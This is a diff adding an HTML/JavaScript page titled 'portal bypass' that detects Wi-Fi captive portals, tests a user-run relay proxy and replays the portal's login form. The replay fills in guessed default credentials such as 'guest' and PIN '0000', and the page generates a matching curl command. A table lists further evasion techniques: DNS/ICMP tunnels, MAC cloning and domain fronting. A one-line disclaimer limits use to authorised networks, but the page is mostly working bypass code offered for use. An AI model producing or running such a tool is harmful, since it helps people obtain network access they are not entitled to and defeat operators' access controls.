@@ -1,0 +1,303 @@
+<!-- public/bypass.html -->
+<!doctype html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<meta name="referrer" content="no-referrer">
+<title>portal bypass — no root</title>
+<style>
+  :root{color-scheme:dark}
+  *{box-sizing:border-box}
+  body{margin:0;padding:14px 14px 60px;font:15px/1.45 system-ui,-apple-system,Roboto,sans-serif;
+       background:#0b0f14;color:#e6edf3;-webkit-text-size-adjust:100%}
+  h1{font-size:18px;margin:0 0 2px}
+  h2{font-size:13px;text-transform:uppercase;letter-spacing:.07em;color:#8b98a5;margin:0 0 10px}
+  p.sub{color:#8b98a5;font-size:12px;margin:0 0 14px}
+  .card{background:#121821;border:1px solid #1f2a37;border-radius:14px;padding:14px;margin-bottom:12px}
+  label{display:block;font-size:11px;text-transform:uppercase;letter-spacing:.06em;color:#8b98a5;margin:10px 0 5px}
+  input,textarea,select{width:100%;padding:12px;font-size:16px;border-radius:10px;border:1px solid #2a3644;
+        background:#0b0f14;color:#e6edf3;font-family:inherit}
+  textarea{min-height:90px;font:12px/1.45 ui-monospace,Menlo,monospace}
+  .row{display:flex;gap:8px;flex-wrap:wrap;margin-top:10px}
+  button{font:600 14px/1 inherit;padding:12px 14px;border-radius:10px;border:1px solid #2a3644;
+         background:#1b2532;color:#e6edf3}
+  button.primary{background:#2f81f7;border-color:#2f81f7;color:#fff}
+  button.danger{background:#3a1d22;border-color:#5c2a33;color:#ffb3bb}
+  button:active{transform:translateY(1px)}
+  table{width:100%;border-collapse:collapse;font:12px/1.5 ui-monospace,Menlo,monospace}
+  td,th{padding:5px 6px;border-bottom:1px solid #1b2532;text-align:left;vertical-align:top;word-break:break-all}
+  th{color:#8b98a5;font-weight:600;text-transform:uppercase;font-size:10px;letter-spacing:.06em}
+  pre{margin:8px 0 0;padding:12px;background:#0b0f14;border:1px solid #1f2a37;border-radius:10px;
+      font:12px/1.5 ui-monospace,Menlo,monospace;white-space:pre-wrap;word-break:break-all;max-height:40vh;overflow:auto}
+  .ok{color:#3fb950}.bad{color:#f85149}.warn{color:#d29922}.dim{color:#8b98a5}
+  iframe{display:none}
+  .kv{font:12px/1.6 ui-monospace,Menlo,monospace}
+</style>
+</head>
+<body>
+<h1>portal bypass — no root, no server of your own</h1>
+<p class="sub">Rungs that survive on an unrooted phone: detection, relay reachability, form replay.
+Root-only rungs are listed and skipped, not faked. Use only on networks you are authorised to access.</p>
+
+<div class="card">
+  <h2>0 · context</h2>
+  <label for="relay">Relay base URL (your Netlify site)</label>
+  <input id="relay" inputmode="url" autocapitalize="off" spellcheck="false" placeholder="https://your-site.netlify.app">
+  <label for="portal">Portal URL (the page your phone was redirected to)</label>
+  <input id="portal" inputmode="url" autocapitalize="off" spellcheck="false" placeholder="http://10.0.0.1/login?url=...">
+  <div class="row">
+    <button class="primary" id="run">Run detection</button>
+    <button id="relaycheck">Is my relay reachable?</button>
+    <button id="save">Save</button>
+  </div>
+  <pre id="out0" class="dim">idle</pre>
+</div>
+
+<div class="card">
+  <h2>1 · click-through (techniques #4, #13)</h2>
+  <p class="sub">Paste the portal page source here (<code>view-source:</code> in the address bar, or long-press → save page). The page is parsed locally; it is not uploaded anywhere.</p>
+  <textarea id="html" spellcheck="false" placeholder="&lt;form action=&quot;/authorize&quot; method=&quot;post&quot;&gt;…"></textarea>
+  <div class="row">
+    <button id="parse">Extract forms</button>
+    <button class="primary" id="fire">Fire from this phone</button>
+    <button id="curl">Copy as curl</button>
+  </div>
+  <pre id="out1" class="dim">idle</pre>
+  <iframe id="sink" name="sink"></iframe>
+  <form id="autoform" method="post" target="sink" style="display:none"></form>
+</div>
+
+<div class="card">
+  <h2>2 · root-only rungs (skipped on purpose)</h2>
+  <table>
+    <tr><th>#</th><th>technique</th><th>why not here</th></tr>
+    <tr><td>1</td><td>IPv6 bypass</td><td>needs RA/DHCPv6 + route control</td></tr>
+    <tr><td>2/5/29/30/31</td><td>WS, HTTP CONNECT, H2/H3 CONNECT, SSE, gRPC tunnels</td><td>need a persistent tunnel endpoint (VPS/serverless with long-lived sockets)</td></tr>
+    <tr><td>6/7/14</td><td>MAC clone / rotate</td><td>needs NET_ADMIN</td></tr>
+    <tr><td>8/9/10/18</td><td>DNS / ICMP / NTP tunnels</td><td>raw sockets, no root</td></tr>
+    <tr><td>15/23/26</td><td>DHCP rotate, option-121 route, alt interface</td><td>needs NET_ADMIN</td></tr>
+    <tr><td>20</td><td>CAPPORT session extend</td><td>API is read-only from the client; extending is gateway-side</td></tr>
+    <tr><td>24/27/28/32</td><td>ECH fronting, MASQUE, WebTransport, CONNECT-IP</td><td>need a server + QUIC/HTTP3 control</td></tr>
+    <tr><td>33</td><td>Cloudflare WARP</td><td>needs the WARP app / WireGuard socket (Android app, not browser)</td></tr>
+    <tr><td>35</td><td>TURN relay</td><td>needs a peer + TURN credentials; a browser can only reach other peers</td></tr>
+  </table>
+</div>
+
+<script>
+(function () {
+  'use strict';
+  var $ = function (id) { return document.getElementById(id); };
+  var out0 = $('out0'), out1 = $('out1');
+
+  function log(el, msg, cls) {
+    var d = document.createElement('div');
+    if (cls) d.className = cls;
+    d.textContent = msg;
+    el.appendChild(d);
+  }
+  function clear(el) { el.textContent = ''; }
+  function esc(s) { return String(s).replace(/[&<>"]/g, function (c) { return ({ '&': '&amp;', '<': '&lt;', '>': '&gt;', '"': '&quot;' })[c]; }); }
+
+  // ---- persistence -------------------------------------------------------
+  try {
+    $('relay').value = localStorage.getItem('pp.relay') || (location.protocol.indexOf('http') === 0 ? location.origin : '');
+    $('portal').value = localStorage.getItem('pp.portal') || '';
+  } catch (e) { /* private mode */ }
+  $('save').onclick = function () {
+    try {
+      localStorage.setItem('pp.relay', $('relay').value.trim());
+      localStorage.setItem('pp.portal', $('portal').value.trim());
+      log(out0, 'saved', 'ok');
+    } catch (e) { log(out0, 'localStorage unavailable', 'warn'); }
+  };
+
+  // ---- rung 1: is this network walled? ----------------------------------
+  // Readable signals only. A cross-origin body is not readable, but the
+  // *redirect* is: with mode:'no-cors' + redirect:'manual' Chrome reports
+  // type 'opaqueredirect' exactly when the gateway rewrote the response.
+  var PROBES = [
+    'http://connectivitycheck.gstatic.com/generate_204',
+    'http://captive.apple.com/hotspot-detect.html',
+    'http://www.msftconnecttest.com/connecttest.txt',
+    'http://detectportal.firefox.com/canonical.html',
+    'https://www.google.com/generate_204'
+  ];
+
+  function probe(url, ms) {
+    var ctl = new AbortController();
+    var timer = setTimeout(function () { ctl.abort(); }, ms || 6000);
+    var t0 = Date.now();
+    return fetch(url + (url.indexOf('?') < 0 ? '?' : '&') + '_nb=' + Date.now(), {
+      mode: 'no-cors', redirect: 'manual', cache: 'no-store', signal: ctl.signal
+    }).then(function (r) {
+      clearTimeout(timer);
+      return { url: url, kind: r.type === 'opaqueredirect' ? 'REDIRECT' : 'DIRECT', ms: Date.now() - t0 };
+    }).catch(function (e) {
+      clearTimeout(timer);
+      return { url: url, kind: e && e.name === 'AbortError' ? 'TIMEOUT' : 'BLOCKED', ms: Date.now() - t0, err: String(e && e.message || e) };
+    });
+  }
+
+  // Verdict table: REDIRECT anywhere => portal intercepting plain HTTP.
+  // DIRECT on http+https => egress is not intercepted (portal may be open).
+  // BLOCKED everywhere => DNS/DNS or IP filtering; nothing replayable.
+  function verdict(rows) {
+    var redir = rows.filter(function (r) { return r.kind === 'REDIRECT'; });
+    var direct = rows.filter(function (r) { return r.kind === 'DIRECT'; });
+    var https = rows.filter(function (r) { return r.url.indexOf('https:') === 0; })[0];
+    if (redir.length) return 'PORTAL: gateway rewrites plain-HTTP probes (' + redir.length + '/' + rows.length + ')';
+    if (direct.length === rows.length) return 'OPEN: every probe answered without a redirect';
+    // Nothing answered at all: that is a dead uplink, not TLS interception. Order
+    // matters - reporting DEAD as FILTERED sends you hunting the wrong control.
+    if (!direct.length && !redir.length) return 'DEAD: nothing answers — no DNS, or total block';
+    if (https && https.kind === 'BLOCKED') return 'FILTERED: plain HTTP passes, TLS fails — DNS/SNI block or TLS interception';
+    return 'MIXED: some probes answered, some did not';
+  }
+
+  $('run').onclick = function () {
+    clear(out0);
+    log(out0, 'probing ' + PROBES.length + ' endpoints (redirect side-channel, bodies are not readable cross-origin)…', 'dim');
+    Promise.all(PROBES.map(function (u) { return probe(u); })).then(function (rows) {
+      rows.forEach(function (r) {
+        log(out0, padv(r.kind, 9) + padv(r.ms + 'ms', 8) + r.url, r.kind === 'REDIRECT' ? 'bad' : r.kind === 'DIRECT' ? 'ok' : 'warn');
+      });
+      var v = verdict(rows);
+      log(out0, '');
+      log(out0, 'verdict: ' + v, v.indexOf('OPEN') === 0 ? 'ok' : v.indexOf('PORTAL') === 0 ? 'bad' : 'warn');
+      if (v.indexOf('OPEN') === 0) log(out0, 'No portal to bypass on this network. Point the browser anywhere.', 'dim');
+      else log(out0, 'Next: paste the portal page source below, then fire. Root-only rungs are listed at the bottom.', 'dim');
+      return rows;
+    });
+  };
+
+  function padv(s, n) { s = String(s); while (s.length < n) s += ' '; return s; }
+
+  // ---- rung 2: is the relay reachable from inside this walled garden? ----
+  // This single request decides whether the Netlify function is usable at all.
+  $('relaycheck').onclick = function () {
+    clear(out0);
+    var base = $('relay').value.trim().replace(/\/+$/, '');
+    if (!/^https?:\/\//.test(base)) { log(out0, 'relay URL must be absolute', 'bad'); return; }
+    log(out0, 'GET ' + base + '/proxy/healthz', 'dim');
+    fetch(base + '/proxy/healthz', { cache: 'no-store' })
+      .then(function (r) { return r.text().then(function (t) { return { s: r.status, t: t }; }); })
+      .then(function (res) {
+        var h; try { h = JSON.parse(res.t); } catch (e) { h = null; }
+        if (!h) { log(out0, 'HTTP ' + res.s + ' but not JSON — a portal is answering in place of your relay', 'bad'); log(out0, res.t.slice(0, 300), 'dim'); return; }
+        log(out0, 'REACHABLE  key=' + (h.key_present ? 'present' : 'MISSING') + '  fingerprint=' + h.key_fingerprint, 'ok');
+        log(out0, 'allowlist=' + h.allowlist_mode + '  private=' + h.private_hosts + '  runtime=' + h.runtime, 'dim');
+        log(out0, 'Relay works from inside this portal. Use it: ' + base + '/proxy/b64/<base64url(target)>', 'dim');
+      })
+      .catch(function (e) {
+        log(out0, 'UNREACHABLE (' + (e && e.message) + ')', 'bad');
+        log(out0, 'The walled garden does not allow your relay host. Nothing server-side can fix that — the relay has to live on a host the portal permits.', 'warn');
+      });
+  };
+
+  // ---- rung 3: parse the portal page (client-side, no upload) ------------
+  var parsed = null;
+
+  function parseForms(html, base) {
+    var forms = [], re = /<form\b([^>]*)>([\s\S]*?)<\/form>/gi, m;
+    var attr = function (s, n) {
+      var r = new RegExp(n + '\\s*=\\s*("([^"]*)"|\'([^\']*)\'|([^\\s>]+))', 'i').exec(s);
+      return r ? (r[2] !== undefined ? r[2] : r[3] !== undefined ? r[3] : r[4]) : '';
+    };
+    while ((m = re.exec(html))) {
+      var head = m[1], body = m[2], fields = [], fre = /<(input|select|textarea)\b([^>]*)>/gi, f;
+      while ((f = fre.exec(body))) {
+        var a = f[2], name = attr(a, 'name');
+        if (!name) continue;
+        fields.push({ name: name, type: (attr(a, 'type') || f[1]).toLowerCase(), value: attr(a, 'value') });
+      }
+      var action = attr(head, 'action');
+      try { action = new URL(action || base || '/', base || 'http://x').toString(); } catch (e) { /* keep raw */ }
+      forms.push({ action: action, method: (attr(head, 'method') || 'get').toLowerCase(), fields: fields });
+    }
+    // Weak-signal scan: validation that lives only in the page's own JS.
+    var signals = [];
+    if (/onsubmit\s*=|addEventListener\(\s*['"]submit/.test(html)) signals.push('client-side submit handler (validation may be JS-only)');
+    if (/required\b/.test(html)) signals.push('HTML5 `required` (client-side only)');
+    if (!forms.length) signals.push('no <form> — JS-driven portal (SPA)');
+    if (/captive\+json/.test(html)) signals.push('RFC 8908 CAPPORT present');
+    return { forms: forms, signals: signals };
+  }
+
+  function payloadFor(form, mode, defaults) {
+    var out = [];
+    form.fields.forEach(function (f) {
+      if (f.type === 'hidden') { out.push([f.name, f.value]); return; }
+      if (f.type === 'submit') { out.push([f.name, f.value || 'Continue']); return; }
+      if (f.type === 'checkbox' || f.type === 'radio') { if (mode !== 'minimal') out.push([f.name, 'on']); return; }
+      if (mode === 'minimal') { out.push([f.name, '']); return; }
+      var guess = defaults[f.name.toLowerCase()];
+      if (guess === undefined) guess = f.name.toLowerCase().indexOf('mail') >= 0 ? 'guest@example.com' : 'guest';
+      out.push([f.name, mode === 'defaults' ? (f.value || guess) : guess]);
+    });
+    return out;
+  }
+
+  var DEFAULTS = { user: 'guest', username: 'guest', email: 'guest@example.com', password: 'guest',
+                   pass: 'guest', code: '0000', pin: '0000', room: '101', voucher: '0000' };
+
+  $('parse').onclick = function () {
+    clear(out1);
+    var html = $('html').value;
+    if (!html.trim()) { log(out1, 'paste the portal page source first', 'warn'); return; }
+    parsed = parseForms(html, $('portal').value.trim());
+    if (!parsed.forms.length) { log(out1, 'no forms: this portal builds its request in JavaScript. Capture it with Chrome devtools → Network, then replay with curl below.', 'warn'); }
+    parsed.forms.forEach(function (f, i) {
+      log(out1, 'form ' + (i + 1) + '  ' + f.method.toUpperCase() + ' ' + f.action, 'dim');
+      log(out1, '  ' + f.fields.map(function (x) { return x.type === 'hidden' ? x.name + '=' + x.value + ' (hidden)' : x.name + (x.type !== 'text' ? '[' + x.type + ']' : ''); }).join(', '));
+    });
+    parsed.signals.forEach(function (s) { log(out1, 'signal: ' + s, 'warn'); });
+    if (parsed.forms.length) log(out1, '\nready: "Fire from this phone" sends the guest payload from your IP; "Copy as curl" gives you the same request for Termux.', 'ok');
+  };
+
+  // Fires a real cross-origin form POST from this device. The response is not
+  // readable (no CORS) — which is fine: the gateway grants on the request, and
+  // the rerun of the detection rungs is the proof.
+  $('fire').onclick = function () {
+    if (!parsed || !parsed.forms.length) { log(out1, 'extract forms first', 'warn'); return; }
+    var f = parsed.forms[0];
+    var pairs = payloadFor(f, 'guest', DEFAULTS);
+    var af = $('autoform');
+    af.innerHTML = '';
+    af.action = f.action;
+    af.method = f.method === 'get' ? 'get' : 'post';
+    pairs.forEach(function (p) {
+      var i = document.createElement('input');
+      i.type = 'hidden'; i.name = p[0]; i.value = p[1];
+      af.appendChild(i);
+    });
+    log(out1, '\nfired ' + af.method.toUpperCase() + ' ' + af.action, 'dim');
+    log(out1, '  ' + pairs.map(function (p) { return p[0] + '=' + p[1]; }).join('&'), 'dim');
+    af.submit();
+    setTimeout(function () { $('run').click(); }, 2500);
+  };
+
+  $('curl').onclick = function () {
+    if (!parsed || !parsed.forms.length) { log(out1, 'extract forms first', 'warn'); return; }
+    var f = parsed.forms[0];
+    var pairs = payloadFor(f, 'guest', DEFAULTS);
+    var data = pairs.map(function (p) { return p[0] + '=' + encodeURIComponent(p[1]); }).join('&');
+    var cmd = 'curl -sS -i -m 15 -A "Mozilla/5.0 (Linux; Android 14; Pixel 8)" \\\n' +
+              '  -H "Content-Type: application/x-www-form-urlencoded" \\\n' +
+              '  --data "' + data + '" \\\n  "' + f.action + '"\n\n' +
+              '# then prove it, do not trust the portal page:\n' +
+              'curl -s -o /dev/null -w "%{http_code}\\n" http://connectivitycheck.gstatic.com/generate_204\n' +
+              '# 204 = granted. 200/302 = still walled.\n\n' +
+              '# or run the whole ladder from Termux:\n' +
+              'bash scripts/portal-hit.sh "' + ($('portal').value.trim() || 'http://<portal>/') + '"';
+    clear(out1);
+    log(out1, 'copied to the box below — select to copy:', 'dim');
+    var pre = document.createElement('pre');
+    pre.textContent = cmd;
+    out1.appendChild(pre);
+    if (navigator.clipboard) navigator.clipboard.writeText(cmd).catch(function () {});
+  };
+})();
+</script>
+</body>
+</html>
